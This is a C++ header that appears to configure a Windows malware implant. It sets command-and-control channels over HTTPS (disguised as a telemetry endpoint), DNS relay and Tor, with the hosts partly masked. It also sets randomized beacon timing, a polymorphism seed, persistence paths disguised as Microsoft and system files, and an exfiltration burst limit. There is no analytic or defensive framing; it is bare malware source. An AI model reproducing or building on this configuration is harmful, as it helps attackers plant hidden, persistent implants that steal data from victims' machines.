#pragma once

#ifndef GHOST_CONFIG_H
#define GHOST_CONFIG_H

#include <cstdint>

#define POLY_SEED 0xA7F3B9C2E1D4

namespace config {
    constexpr const wchar_t* C2_HTTPS_DOMAIN = L"#######";
    constexpr const wchar_t* C2_HTTPS_PATH = L"/v3/telemetry/report";

    constexpr const wchar_t* C2_DNS_BASE = L"relay";
    constexpr const wchar_t* C2_DNS_TLD = L"alwaysdata[.]net";

    constexpr const char* C2_TOR_ONION = "######";

    constexpr int BEACON_MIN = 300;
    constexpr int BEACON_MAX = 1800;

    constexpr const char* MACHINE_KEY_SALT = "byp0s-salt-2077";

    constexpr const wchar_t* PERSIST_PATH_1 = L"%APPDATA%\\Microsoft\\Windows\\Libraries\\sysupd.dll";
    constexpr const wchar_t* PERSIST_PATH_2 = L"%LOCALAPPDATA%\\Packages\\syscore\\LocalCache\\upd.dat";

    constexpr int MAX_EXFIL_BURST = 524288;
}

#endif